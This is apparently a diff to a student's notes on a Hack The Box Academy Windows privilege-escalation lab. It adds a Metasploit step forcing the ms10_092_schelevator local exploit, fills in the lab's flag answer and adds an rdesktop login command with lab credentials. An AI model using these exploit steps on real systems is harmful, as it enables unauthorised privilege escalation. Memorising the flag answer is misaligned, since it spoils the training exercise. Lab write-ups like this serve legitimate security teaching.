@@ -294,6 +294,9 @@ msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443
 
 lport => 4443
 
+msf6 exploit(windows/local/ms10_092_schelevator) > set ForceExploit true
+
+ForceExploit => true
 
 msf6 exploit(windows/local/ms10_092_schelevator) > show options
 
@@ -371,4 +374,9 @@ Meterpreter     : x86/windows
 
 ## Questions
 RDP to 10.129.104.52 (ACADEMY-WINLPE-2K8), with user `htb-student` and password `HTB_@cademy_stdnt!`
-1. Obtain a shell on the target host, enumerate the system and escalate privileges. Submit the contents of the flag.txt file on the Administrator Desktop. **Answer:**
+1. Obtain a shell on the target host, enumerate the system and escalate privileges. Submit the contents of the flag.txt file on the Administrator Desktop. **Answer: L3gacy_st1ill_pr3valent!**
+   - If `xfreerdp` does not work, use `rdesktop`:
+      ```shellsession
+      $ rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' 10.129.115.207
+      ```
+   - Follow the steps in this section to escalate and read the flag
